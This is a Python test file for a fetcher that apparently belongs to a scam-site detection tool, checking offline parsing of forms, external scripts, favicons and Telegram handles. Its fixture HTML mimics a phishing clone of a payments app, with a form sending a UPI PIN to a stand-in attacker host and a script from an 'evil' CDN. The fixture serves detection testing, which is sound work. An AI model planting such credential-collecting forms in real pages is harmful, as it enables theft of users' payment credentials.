"""Offline tests for the page fetcher. HTML is fed directly; no network."""
from app.services import fetcher

CANNED_HTML = """
<html><head>
  <link rel="shortcut icon" href="/favicon.ico">
  <script src="https://evil-cdn.example/track.js"></script>
  <script src="/local.js"></script>
</head><body>
  <form action="https://attacker.example/collect" method="POST">
    <input name="vpa" type="text">
    <input name="upi_pin" type="password">
  </form>
</body></html>
"""


def test_parse_html_extracts_forms_and_external_scripts():
    forms, external, favicon = fetcher.parse_html(CANNED_HTML, base_url="http://phonepe-clone.xyz/")
    assert len(forms) == 1
    form = forms[0]
    assert form["action"] == "https://attacker.example/collect"
    assert form["method"] == "post"
    names = {i["name"] for i in form["inputs"]}
    assert names == {"vpa", "upi_pin"}
    # external script detected, same-origin/relative one excluded
    assert "https://evil-cdn.example/track.js" in external
    assert "/local.js" not in external
    assert favicon == "/favicon.ico"


def test_fetch_with_injected_fn_returns_result():
    def stub(url, timeout):
        forms, external, favicon = fetcher.parse_html(CANNED_HTML, url)
        return fetcher.FetchResult(url=url, final_url=url, redirect_chain=[url],
                                   status=200, html=CANNED_HTML, forms=forms,
                                   external_script_srcs=external, favicon_href=favicon, ok=True)

    result = fetcher.fetch("http://phonepe-clone.xyz/", fetch_fn=stub)
    assert result.ok and result.status == 200
    assert result.forms and result.external_script_srcs


def test_fetch_returns_typed_empty_on_failure():
    def boom(url, timeout):
        raise RuntimeError("simulated fetch failure")

    result = fetcher.fetch("http://phonepe-clone.xyz/", fetch_fn=boom)
    assert isinstance(result, fetcher.FetchResult)
    assert result.ok is False
    assert result.html == ""
    assert result.forms == [] and result.external_script_srcs == []
    assert result.redirect_chain == []


def test_parse_html_handles_empty_and_malformed():
    forms, external, favicon = fetcher.parse_html("", base_url="")
    assert forms == [] and external == [] and favicon is None


def test_favicon_hash_is_stable():
    assert fetcher.favicon_hash_of(b"abc") == fetcher.favicon_hash_of(b"abc")
    assert fetcher.favicon_hash_of(b"abc") != fetcher.favicon_hash_of(b"xyz")


def test_telegram_extraction_offline():
    from app.services import extractor
    out = extractor.extract("join https://t.me/fakepaygroup or dm @supportdesk now")
    assert "fakepaygroup" in out["telegram"]
    assert "supportdesk" in out["telegram"]
    # existing keys preserved
    assert set(["urls", "upi_ids", "phones", "telegram"]).issubset(out.keys())
